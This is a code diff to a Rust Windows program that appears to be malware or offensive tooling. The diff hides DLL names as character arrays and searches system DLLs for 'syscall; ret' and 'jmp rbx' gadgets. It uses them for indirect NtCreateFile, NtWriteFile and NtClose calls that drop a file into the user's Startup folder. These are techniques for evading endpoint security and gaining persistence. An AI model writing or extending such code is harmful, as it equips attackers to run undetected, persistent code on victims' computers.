@@ -173,15 +173,42 @@ fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
 
 fn main() {
     unsafe {
-        let ntdll_base = syscalls::get_ntdll_base();
+        let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
+        let k32_name = ['k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
+        let kbase_name = ['k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, 'b' as u16, 'a' as u16, 's' as u16, 'e' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
+
+        let ntdll_base = syscalls::get_module_base(&ntdll_name);
         if ntdll_base.is_null() { return; }
 
         let nt_create_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtCreateFile").expect("Failed to get NtCreateFile SSN");
         let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
         let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");
 
-        let syscall_gadget = syscalls::find_syscall_gadget(ntdll_base as *const u8).expect("Failed to find syscall gadget");
-        let jmp_rbx_gadget = syscalls::find_jmp_rbx_gadget(ntdll_base as *const u8).expect("Failed to find jmp rbx gadget");
+        let modules: [&[u16]; 3] = [&ntdll_name, &k32_name, &kbase_name];
+
+        let mut syscall_gadget = null_mut();
+        for mod_name in &modules {
+            let base = syscalls::get_module_base(mod_name);
+            if !base.is_null() {
+                if let Some(g) = syscalls::find_gadget(base as *const u8, &[&[0x0F, 0x05, 0xC3]]) {
+                    syscall_gadget = g as *mut c_void;
+                    break;
+                }
+            }
+        }
+        if syscall_gadget.is_null() { return; }
+
+        let mut jmp_rbx_gadget = null_mut();
+        for mod_name in &modules {
+            let base = syscalls::get_module_base(mod_name);
+            if !base.is_null() {
+                if let Some(g) = syscalls::find_gadget(base as *const u8, &[&[0xFF, 0xE3], &[0x53, 0xC3]]) {
+                    jmp_rbx_gadget = g as *mut c_void;
+                    break;
+                }
+            }
+        }
+        if jmp_rbx_gadget.is_null() { return; }
 
         // 1. Resolve Startup folder path using SHGetKnownFolderPath
         let mut path_ptr: *mut u16 = null_mut();
@@ -239,8 +266,8 @@ fn main() {
 
                                 let status = crate::syscall!(
                                     nt_create_file_ssn,
-                                    syscall_gadget,
-                                    jmp_rbx_gadget,
+                                    syscall_gadget as *const u8,
+                                    jmp_rbx_gadget as *const u8,
                                     &mut out_handle as *mut _ as usize,
                                     (GENERIC_WRITE | SYNCHRONIZE) as usize,
                                     &mut obj_attr as *mut _ as usize,
@@ -258,8 +285,8 @@ fn main() {
                                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                                     crate::syscall!(
                                         nt_write_file_ssn,
-                                        syscall_gadget,
-                                        jmp_rbx_gadget,
+                                        syscall_gadget as *const u8,
+                                        jmp_rbx_gadget as *const u8,
                                         out_handle as usize,
                                         0,
                                         0,
@@ -270,7 +297,7 @@ fn main() {
                                         0,
                                         0
                                     );
-                                    crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
+                                    crate::syscall!(nt_close_ssn, syscall_gadget as *const u8, jmp_rbx_gadget as *const u8, out_handle as usize);
                                 }
                                 GlobalUnlock(hglobal);
                             }
